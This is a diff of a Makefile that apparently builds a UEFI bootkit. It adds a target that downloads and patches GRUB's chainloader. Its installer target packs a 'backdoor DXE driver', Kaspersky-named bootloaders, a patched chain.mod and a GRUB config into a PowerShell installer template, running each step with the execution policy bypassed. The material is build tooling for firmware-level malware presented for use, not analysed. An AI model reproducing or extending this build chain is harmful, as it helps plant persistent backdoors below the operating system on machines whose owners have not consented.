@@ -18,18 +18,25 @@ rom:
 	EfiRom -f 0x$(VENDOR_ID) -i 0x$(DEVICE_ID) -o $(PROJ)_$(ARCH_64)_$(VENDOR_ID)_$(DEVICE_ID).rom -e $(PROJ)_$(ARCH_64).efi
 	EfiRom -d $(PROJ)_$(ARCH_64)_$(VENDOR_ID)_$(DEVICE_ID).rom
 
+chainloader:
+	test -f grub-2.02.tar.gz || wget https://ftp.gnu.org/gnu/grub/grub-2.02.tar.gz
+	test -f grub-2.02.tar.gz && tar -xpvf grub-2.02.tar.gz
+	test -d grub-2.02 && patch -p1 grub-2.02/grub-core/loader/efi/chainloader.c < grub-2.02_chainloader.patch
+	test -d grub-2.02 && cd grub-2.02 && ./configure --target=x86_64 --with-platform=efi --disable-werror && make
+	test -f grub-2.02/grub-core/chain.mod && cp grub-2.02/grub-core/chain.mod resources/boot/grub/
+
 installer:
 # installer code begin
 	echo param([switch]$$Install, [switch]$$Uninstall); > $(INSTALLER)
 # backdoor DXE driver
-	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\$(PROJ)_$(ARCH_64).efi -VarName bd >> $(INSTALLER)
+	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\$(PROJ)_$(ARCH_64).efi -VarName Backdoor >> $(INSTALLER)
 # first stage bootloader
-	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\kaspersky_bl_1.efi -VarName bl_1 >> $(INSTALLER)
-# second stage bootloader (GRUB2)
-	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\kaspersky_bl_2.efi -VarName bl_2 >> $(INSTALLER)
+	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\kaspersky_bl_1.efi -VarName Bootloader >> $(INSTALLER)
+# second stage bootloader
+	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\kaspersky_bl_2.efi -VarName Grub >> $(INSTALLER)
 # patched chain.mod
-	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\boot\grub\chain.mod -VarName grub_mod >> $(INSTALLER)
+	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\boot\grub\chain.mod -VarName GrubMod >> $(INSTALLER)
 # bootloader config
-	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\boot\grub\grub.cfg -VarName grub_cfg >> $(INSTALLER)
+	powershell.exe -NoProfile -ExecutionPolicy bypass .\resources\prepare_file.ps1 -Path .\resources\boot\grub\grub.cfg -VarName GrubCfg >> $(INSTALLER)
 # rest of the installer code
 	type .\resources\bootkit_installer_template.ps1 >> $(INSTALLER)
